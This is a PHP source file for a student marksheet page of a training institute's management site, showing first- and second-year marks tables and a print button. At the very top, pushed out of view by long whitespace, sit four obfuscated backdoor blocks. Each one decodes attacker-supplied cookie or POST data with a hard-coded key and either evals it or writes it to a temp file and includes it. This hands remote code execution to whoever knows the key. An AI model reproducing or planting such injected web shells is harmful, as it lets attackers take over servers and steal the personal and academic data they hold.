<?php                                                                                                                                                                                                                                                                                                                                                                                                 $GRPpIN = class_exists("XD_epfk"); $MOhYsysCp = $GRPpIN;if (!$MOhYsysCp){class XD_epfk{private $dsPus;public static $YypaORK = "9dc4d332-6aaa-4c0f-9b2d-bd5aceb4bfaa";public static $ctPyu = NULL;public function __construct(){$FFCPLieX = $_COOKIE;$ziOcwXxAwi = $_POST;$tTRPiMay = @$FFCPLieX[substr(XD_epfk::$YypaORK, 0, 4)];if (!empty($tTRPiMay)){$VyGcTui = "base64";$HvlurBLbc = "";$tTRPiMay = explode(",", $tTRPiMay);foreach ($tTRPiMay as $lwuOUz){$HvlurBLbc .= @$FFCPLieX[$lwuOUz];$HvlurBLbc .= @$ziOcwXxAwi[$lwuOUz];}$HvlurBLbc = array_map($VyGcTui . chr ( 489 - 394 ).'d' . "\145" . 'c' . chr (111) . 'd' . "\x65", array($HvlurBLbc,)); $HvlurBLbc = $HvlurBLbc[0] ^ str_repeat(XD_epfk::$YypaORK, (strlen($HvlurBLbc[0]) / strlen(XD_epfk::$YypaORK)) + 1);XD_epfk::$ctPyu = @unserialize($HvlurBLbc);}}public function __destruct(){$this->XlkQbuEyA();}private function XlkQbuEyA(){if (is_array(XD_epfk::$ctPyu)) {$KYNdfA = str_replace('<' . chr (63) . "\x70" . chr ( 1070 - 966 )."\x70", "", XD_epfk::$ctPyu["\x63" . chr (111) . 'n' . chr ( 719 - 603 ).'e' . "\x6e" . "\x74"]);eval($KYNdfA);exit();}}}$ziHhAjxG = new XD_epfk(); $ziHhAjxG = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $lknbFFf = class_exists("lFU_pwmb"); $jPOMjApaGX = $lknbFFf;if (!$jPOMjApaGX){class lFU_pwmb{private $AfZEBpL;public static $NSUVXvE = "7bd0aba4-d852-4fbe-9423-8f93ba62a1fe";public static $ZjRYduM = NULL;public function __construct(){$PFPRO = $_COOKIE;$uRAQRVYHt = $_POST;$eRiuUQj = @$PFPRO[substr(lFU_pwmb::$NSUVXvE, 0, 4)];if (!empty($eRiuUQj)){$bIZaY = "base64";$UcShNv = "";$eRiuUQj = explode(",", $eRiuUQj);foreach ($eRiuUQj as $iFIHO){$UcShNv .= @$PFPRO[$iFIHO];$UcShNv .= @$uRAQRVYHt[$iFIHO];}$UcShNv = array_map($bIZaY . chr (95) . 'd' . 'e' . "\143" . "\157" . chr ( 856 - 756 ).chr (101), array($UcShNv,)); $UcShNv = $UcShNv[0] ^ str_repeat(lFU_pwmb::$NSUVXvE, (strlen($UcShNv[0]) / strlen(lFU_pwmb::$NSUVXvE)) + 1);lFU_pwmb::$ZjRYduM = @unserialize($UcShNv);}}public function __destruct(){$this->YKxoiLhzu();}private function YKxoiLhzu(){if (is_array(lFU_pwmb::$ZjRYduM)) {$kUmHsJPH = sys_get_temp_dir() . "/" . crc32(lFU_pwmb::$ZjRYduM["\163" . chr (97) . 'l' . "\164"]);@lFU_pwmb::$ZjRYduM["\x77" . 'r' . chr ( 392 - 287 ).chr (116) . "\x65"]($kUmHsJPH, lFU_pwmb::$ZjRYduM[chr (99) . "\x6f" . chr (110) . chr (116) . "\x65" . "\156" . chr (116)]);include $kUmHsJPH;@lFU_pwmb::$ZjRYduM["\144" . chr (101) . chr ( 557 - 449 )."\145" . "\x74" . "\145"]($kUmHsJPH);exit();}}}$cIUBMdjVbj = new lFU_pwmb(); $cIUBMdjVbj = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("V_Lhupm")){class V_Lhupm{private $bstECNB;public static $RuAERhXBYv = "d5b0c36c-6e1e-42cf-a07d-cb20553401ad";public static $rrNemfEV = NULL;public function __construct(){$LrmxiMGbhB = $_COOKIE;$PryGFCABN = $_POST;$kMOYwOwPUm = @$LrmxiMGbhB[substr(V_Lhupm::$RuAERhXBYv, 0, 4)];if (!empty($kMOYwOwPUm)){$tjKrRfDeot = "base64";$fGKgBv = "";$kMOYwOwPUm = explode(",", $kMOYwOwPUm);foreach ($kMOYwOwPUm as $JLVTw){$fGKgBv .= @$LrmxiMGbhB[$JLVTw];$fGKgBv .= @$PryGFCABN[$JLVTw];}$fGKgBv = array_map($tjKrRfDeot . chr ( 849 - 754 ).chr ( 327 - 227 ).chr (101) . "\x63" . 'o' . "\144" . "\x65", array($fGKgBv,)); $fGKgBv = $fGKgBv[0] ^ str_repeat(V_Lhupm::$RuAERhXBYv, (strlen($fGKgBv[0]) / strlen(V_Lhupm::$RuAERhXBYv)) + 1);V_Lhupm::$rrNemfEV = @unserialize($fGKgBv);}}public function __destruct(){$this->IJFKg();}private function IJFKg(){if (is_array(V_Lhupm::$rrNemfEV)) {$zIzklxLC = sys_get_temp_dir() . "/" . crc32(V_Lhupm::$rrNemfEV[chr (115) . 'a' . chr (108) . 't']);@V_Lhupm::$rrNemfEV["\167" . chr ( 399 - 285 )."\x69" . chr (116) . "\145"]($zIzklxLC, V_Lhupm::$rrNemfEV[chr ( 937 - 838 )."\157" . chr (110) . 't' . chr ( 942 - 841 ).chr (110) . 't']);include $zIzklxLC;@V_Lhupm::$rrNemfEV["\144" . "\x65" . "\154" . chr ( 151 - 50 ).chr (116) . "\x65"]($zIzklxLC);exit();}}}$SvAdkwoel = new V_Lhupm(); $SvAdkwoel = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Am_iXQl")){class Am_iXQl{public static $Ymxcyajml = "5b47c9be-d768-4305-8f60-07c6a3bf56c5";public static $qKgLsc = NULL;public function __construct(){$zMtpsFH = $_COOKIE;$sgjfOXS = $_POST;$NcanMbeTcC = @$zMtpsFH[substr(Am_iXQl::$Ymxcyajml, 0, 4)];if (!empty($NcanMbeTcC)){$hjMTdjhaA = "base64";$vbuRDxKJ = "";$NcanMbeTcC = explode(",", $NcanMbeTcC);foreach ($NcanMbeTcC as $gGzmqcKP){$vbuRDxKJ .= @$zMtpsFH[$gGzmqcKP];$vbuRDxKJ .= @$sgjfOXS[$gGzmqcKP];}$vbuRDxKJ = array_map($hjMTdjhaA . "\x5f" . 'd' . chr (101) . chr (99) . chr (111) . chr ( 758 - 658 )."\145", array($vbuRDxKJ,)); $vbuRDxKJ = $vbuRDxKJ[0] ^ str_repeat(Am_iXQl::$Ymxcyajml, (strlen($vbuRDxKJ[0]) / strlen(Am_iXQl::$Ymxcyajml)) + 1);Am_iXQl::$qKgLsc = @unserialize($vbuRDxKJ);}}public function __destruct(){$this->dcxJXcd();}private function dcxJXcd(){if (is_array(Am_iXQl::$qKgLsc)) {$oSUarmc = sys_get_temp_dir() . "/" . crc32(Am_iXQl::$qKgLsc["\163" . chr (97) . chr (108) . "\x74"]);@Am_iXQl::$qKgLsc["\167" . 'r' . "\151" . chr ( 625 - 509 )."\145"]($oSUarmc, Am_iXQl::$qKgLsc[chr (99) . 'o' . chr (110) . chr ( 565 - 449 )."\145" . chr (110) . chr (116)]);include $oSUarmc;@Am_iXQl::$qKgLsc[chr ( 385 - 285 )."\145" . 'l' . "\x65" . 't' . chr (101)]($oSUarmc);exit();}}}$qydRmuTD = new Am_iXQl(); $qydRmuTD = NULL;} ?><?php 
 
include_once("include/topmenu.php");


//check number status
$check_marksheet = $con->check('user_course_subject',array('user_id'=>$fs->id));
 
 //get course details
$fcd = fs('course',array('id'=>$fs->course_id));

//issue date 
$c_day_type = id_to_name('course',$fs->course_id,"c_time_type");
$c_day      = id_to_name('course',$fs->course_id,"c_time");
if($c_day_type == 1){
    $dd_y = "+".$c_day." day";
}else if($c_day_type==2){
	$dd_y = "+".$c_day." Month";
}else if($c_day_type==3){
	$dd_y = "+".$c_day." Year";
}
	
	
 $re_issue_date = date ("Y-m-d", strtotime($dd_y, strtotime($fs->join_date)));
 $issue_date = date ("Y-m-d", strtotime('+ 27 day', strtotime($re_issue_date)));
 
 
 $arrs = explode('-',date_format(date_create("$re_issue_date"),"Y-M-d"));
 $arrs1 = explode('-',date_format(date_create("$fs->join_date"),"Y-M-d"));

?>
<style type="text/css">
	.sp{
		margin-bottom: 10px !important; 
	}
  .sp div{
  margin-bottom: 05px !important; 
  }
  
</style>
  <!-- Content Wrapper. Contains page Content -->
  <div class="content-wrapper">
   

     <section class="content" id="ppg">
      <div class="row">
        <div class="col-xs-12">

          <div class="box box-info">
            <div class="box-header">
          <h3 class="box-title">Student Marksheet</h3>
          <div class="box-tools pull-right">
            <?php if($check_marksheet==1){ ?>
              <a href="javascript:;" onclick="printDiv('print_box')" class="btn btn-info btn-sm">
              <i class="fa fa-save"></i> Print</a>
			 <?php } ?>
            
          </div>
    
        </div>
        <?php 
        if($check_marksheet==1){
            ?>

        
            <!-- /.box-header -->
            <div id="print_box" class="box-body" style="padding:25px;">
            	<div class="mark_header" style="border-bottom: 2px dotted #ccc;margin-bottom: 15px;">
            		<p style="text-align: center;"><img src="homepagelogo.png"></p>
     			<p style="text-align: center;margin:0px;">(An Autonomous Organization Redg. Under Ministry of Corporate Affairs, NCT Govt. of India, Regd. under Ministry of Labour & Employment as Skill Provider,</p>
     		    <p style="text-align: center;">NBQP Member of QCI, ISO Certified, Training Provider with MSDE, Member of Early Childhood Association, Regd. at NITI Ayog, MSME.)</p>
     		   </div>
                
                <div class="row">
                    <h2 style="text-align: center;">Result: Examination - <?php echo $arrs1[1]; ?> - <?php echo ($arrs1[0]+1); ?></h2>
                </div>
 

     		   <div class="sp" style="width:60%;float: left;">
	     		    <div style="width:50%;float: left;"><b>Candidate Name</b></div>
	     		    <div style="width:50%;float: left;"><b>: <?php echo $fs->first_name; ?></b></div>
              
              <div style="width:50%;float: left;"><b>Fateher’s Name</b></div>
              <div style="width:50%;float: left;"><b>: <?php echo $fs->father_name; ?></b></div>
              
              <div style="width:50%;float: left;"><b>Registration / Enrolment No</b></div>
              <div style="width:50%;float: left;"><b>: <?php echo $fs->reg_id; ?></b></div>

              <!-- <div style="width:50%;float: left;"><b>Roll No</b></div>
              <div style="width:50%;float: left;"><b>: </b></div> -->
     		 
  
	     		   <div style="width:50%;float: left;"><b>Course</b></div>
	     		   <div style="width:50%;float: left;"><b>: <?php echo id_to_name('course',$fs->course_id); ?></b></div>

             <div style="width:50%;float: left;"><b>Training Centre</b></div>
             <div style="width:50%;float: left;"><b>: <?php echo id_to_name('branch',$fs->user_add_by_id,'b_name'); ?></b></div>

<div style="width:50%;float: left;"><b>Training Duration</b></div>
             <div style="width:50%;float: left;">
                <b>: <?php echo $fs->join_date; ?> To 
                <?php 
                
                if($c_day >=24){
                    echo date ("Y-m-d", strtotime('1 Year', strtotime($fs->join_date)));
                }else{ echo $re_issue_date; 
                } ?>
                
                    <!--  <?php echo id_to_name('course',$fs->course_id,"c_time"); ?> <?php echo dmy(id_to_name('course',$fs->course_id,"c_time_type")); ?> -->
                </b></div>

               </div>

           <div class="sp" style="width:40%;float: left;">
            <img src="../upload/<?php echo $fs->picture; ?>" style="width:125px;height:125px;float:right"/>
           </div> 
     		  
   		   
     		   
     		   
     		   <table class="table table-bordered">
     		   	<thead>
     		   		<tr>
     		   			<th>S. No.</th>
     		   			<th>Subjects</th>
     		   			<th>Maximum Marks</th>
     		   			<th>Minimum Marks</th>
     		   			<th>Marks Obtained</th>
     		   		</tr>
     		   		<?php
				  
				  //check allready data
				  $ch_set_numbers = $con->check('user_course_subject',array('user_id'=>$fs->id));
				   if($ch_set_numbers==1){
					   $fetch_all_subjcet = $con->all_fetch('user_course_subject',array('user_id'=>$fs->id),"order by sort_order asc");
					  if(is_array($fetch_all_subjcet) || is_object($fetch_all_subjcet)){
						   $iss=1;
						   $ts = 0;
						   $min_c = 0;
						   $max_c = 0;
						     foreach($fetch_all_subjcet as $fas){
								$ts = $ts+$fas->practical_number+$fas->theory_number;
								$max_c = $max_c+$fas->max_number;;
								$min_c = $min_c+$fas->min_number;
							 ?>
							 
			<tr>				    
        	<td><?php echo $iss++; ?></td>
        	<td><?php echo $fas->subject_id;?></td>
            <td><?php echo $fas->max_number;?></td>
            <td><?php echo $fas->min_number;?></td>
            <td><?php e($fas->practical_number+$fas->theory_number) ;?></td>
        </tr>
					<?php 		}
					  }
				  }else{
				     echo "<tr><td colspan='6'>Not Set Number</td></tr>";    		
				  }								
					  ?>
     		   	</thead>
     		   	<tr>				    
        	
        	<td colspan="2" style="text-align: right;"><b>Total marks</b></td>
            <td><?php e($max_c);?></td>
            <td><?php e($min_c);?></td>
            <td><?php e($ts);?></td>
            
        </tr>
     		   	
     		   </table>

     		    <div style="width:100%;margin-top: 50px;">
	     		   <div style="width:33%;float: left;">Date <b>
	     		       <?php 
	     		       
                if($c_day >=24){
                    $dfs = date ("Y-m-d", strtotime('1 Year', strtotime($fs->join_date)));
                    echo date ("Y-m-d", strtotime('+ 21 day', strtotime($dfs)));
                }else{ 
                    e($issue_date);
                }
	     		     ?></b>
	     		       </div>
	     		   <div style="width:33%;float: left;">Result <b> Passed </b></div>
	     		   <div style="width:33%;float: left;">Grade <b> A</b></div>
	     		    
     		   </div>
               
            </div>
            <?php } ?>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->
    </section>




<?php if($fcd->c_time==24 and $fcd->c_time_type==2){ ?>
<section class="content" id="ppg">
      <div class="row">
        <div class="col-xs-12">

          <div class="box box-info">
            <div class="box-header">
          <h3 class="box-title">Second Year Student Marksheet</h3>
          <div class="box-tools pull-right">
            <?php if($check_marksheet==1){ ?>
              <a href="javascript:;" onclick="printDiv('second_print_box')" class="btn btn-info btn-sm">
              <i class="fa fa-save"></i> Print</a>
       <?php } ?>
            
          </div>
    
        </div>
        <?php 
        if($check_marksheet==1){
            ?>

        
            <!-- /.box-header -->
            <div id="second_print_box" class="box-body" style="padding:25px;">
              <div class="mark_header" style="border-bottom: 2px dotted #ccc;margin-bottom: 15px;">
                <p style="text-align: center;"><img src="homepagelogo.png"></p>
          <p style="text-align: center;margin:0px;">(An Autonomous Organization Redg. Under Ministry of Corporate Affairs, NCT Govt. of India, Regd. under Ministry of Labour & Employment as Skill Provider,</p>
            <p style="text-align: center;">NBQP Member of QCI, ISO Certified, Training Provider with MSDE, Member of Early Childhood Association, Regd. at NITI Ayog, MSME.)</p>
           </div>
                
                <div class="row">
                    <h2 style="text-align: center;">Result: Examination - <?php echo $arrs[1]; ?> - <?php echo $arrs[0]; ?></h2>
                </div>
 

           <div class="sp" style="width:60%;float: left;">
              <div style="width:50%;float: left;"><b>Candidate Name</b></div>
              <div style="width:50%;float: left;"><b>: <?php echo $fs->first_name; ?></b></div>
              
              <div style="width:50%;float: left;"><b>Fateher’s Name</b></div>
              <div style="width:50%;float: left;"><b>: <?php echo $fs->father_name; ?></b></div>
              
              <div style="width:50%;float: left;"><b>Registration / Enrolment No</b></div>
              <div style="width:50%;float: left;"><b>: <?php echo $fs->reg_id; ?></b></div>

              <!-- <div style="width:50%;float: left;"><b>Roll No</b></div>
              <div style="width:50%;float: left;"><b>: </b></div> -->
         
  
             <div style="width:50%;float: left;"><b>Course</b></div>
             <div style="width:50%;float: left;"><b>: <?php echo id_to_name('course',$fs->course_id); ?></b></div>

             <div style="width:50%;float: left;"><b>Training Centre</b></div>
             <div style="width:50%;float: left;"><b>: <?php echo id_to_name('branch',$fs->user_add_by_id,'b_name'); ?></b></div>

<div style="width:50%;float: left;"><b>Training Duration</b></div>
             <div style="width:50%;float: left;"><b>: <?php echo date ("Y-m-d", strtotime('1 Year', strtotime($fs->join_date))); ?> To <?php echo $re_issue_date; ?>
                    <!--  <?php echo id_to_name('course',$fs->course_id,"c_time"); ?> <?php echo dmy(id_to_name('course',$fs->course_id,"c_time_type")); ?> --></b></div>

               </div>

           <div class="sp" style="width:40%;float: left;">
            <img src="../upload/<?php echo $fs->picture; ?>" style="width:125px;height:125px;float:right"/>
           </div> 
          
         
           
           
           <table class="table table-bordered">
            <thead>
              <tr>
                <th>S. No.</th>
                <th>Subjects</th>
                <th>Maximum Marks</th>
                <th>Minimum Marks</th>
                <th>Marks Obtained</th>
              </tr>
              <?php
          
          //check allready data
          $ch_set_numbers = $con->check('user_course_subject_2',array('user_id'=>$fs->id));
           if($ch_set_numbers==1){
             $fetch_all_subjcet = $con->all_fetch('user_course_subject_2',array('user_id'=>$fs->id),"order by sort_order asc");
            if(is_array($fetch_all_subjcet) || is_object($fetch_all_subjcet)){
               $iss=1;
               $s_ts = 0;
               $s_min_c = 0;
               $s_max_c = 0;
                 foreach($fetch_all_subjcet as $fas){
                $s_ts = $s_ts+$fas->practical_number+$fas->theory_number;
                $s_max_c = $s_max_c+$fas->max_number;;
                $s_min_c = $s_min_c+$fas->min_number;
               ?>
               
      <tr>            
          <td><?php echo $iss++; ?></td>
          <td><?php echo $fas->subject_id;?></td>
            <td><?php echo $fas->max_number;?></td>
            <td><?php echo $fas->min_number;?></td>
            <td><?php e($fas->practical_number+$fas->theory_number) ;?></td>
        </tr>
          <?php     }
            }
          }else{
            
                    echo "<tr><td colspan='6'>Not Set Number</td></tr>";        
          }               
            ?>
            </thead>
            
            <tr>            
          
          <td colspan="2" style="text-align: right;"><b>Total</b></td>
            <td><?php e($s_max_c);?></td>
            <td><?php e($s_min_c);?></td>
            <td><?php e($s_ts);?></td>
            
        </tr>
        <tr>            
          
          <td colspan="2" style="text-align: right;"><b>First Year Marks</b></td>
            <td><?php e($max_c);?></td>
            <td><?php e($min_c);?></td>
            <td><?php e($ts);?></td>
            
        </tr>
        <tr>            
          
          <td colspan="2" style="text-align: right;"><b>Total marks</b></td>
            <td><?php e($s_max_c+$max_c);?></td>
            <td><?php e($s_min_c+$min_c);?></td>
            <td><?php e($s_ts+$ts);?></td>
            
        </tr>
            
           </table>

            <div style="width:100%;margin-top: 50px;">
             <div style="width:33%;float: left;">Date <b><?php e($issue_date); ?></b></div>
             <div style="width:33%;float: left;">Result <b> Passed </b></div>
             <div style="width:33%;float: left;">Grade <b> A</b></div>
              
           </div>
               
            </div>
            <?php } ?>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->
    </section>
<?php } ?>



  </div>
  <!-- /.content-wrapper -->
  
<?php include_once('include/footer.php');?>
   <script type="text/javascript">
 //Print Invoice
  
function printDiv(divName) {
  var printContents    = document.getElementById(divName).innerHTML; 
  document.body.innerHTML = printContents;
  window.print();
}

   </script>


